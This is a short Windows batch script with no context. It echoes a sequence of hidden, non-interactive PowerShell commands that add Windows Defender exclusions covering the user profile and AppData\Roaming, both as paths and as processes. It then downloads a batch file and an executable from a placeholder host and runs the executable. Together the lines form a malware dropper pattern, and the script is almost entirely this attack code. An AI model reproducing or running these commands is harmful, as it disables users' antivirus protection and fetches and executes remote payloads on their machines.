@echo off
echo cmd.exe /c powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath '%USERPROFILE%\AppData\Roaming'
echo cmd.exe /c powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath '%USERPROFILE%\AppData\Roaming\'
echo cmd.exe /c powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath '%USERPROFILE%\AppData\Roaming*'
echo cmd.exe /c powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath '%USERPROFILE%\*'
echo cmd.exe /c powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath '%USERPROFILE%'
echo cmd.exe /c powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath '%USERPROFILE%\'
echo cmd.exe /c powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionProcess '%USERPROFILE%\AppData\Roaming'
echo cmd.exe /c powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionProcess '%USERPROFILE%\AppData\Roaming\'
echo cmd.exe /c powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionProcess '%USERPROFILE%\AppData\Roaming*'
echo cmd.exe /c powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionProcess '%USERPROFILE%\*'
echo cmd.exe /c powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionProcess '%USERPROFILE%'
echo cmd.exe /c powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionProcess '%USERPROFILE%\'
echo powershell Invoke-WebRequest https://download.invalid/sh1z01/index/e6a5614c379561c94004c531781ee1c5/?servername=msi -OutFile stage-17.bat
echo powershell Invoke-WebRequest https://download.invalid/sh1z01/index/d2ef590c0310838490561a205469713d/?servername=msi -OutFile runner-42.exe
echo cmd /c runner-42.exe
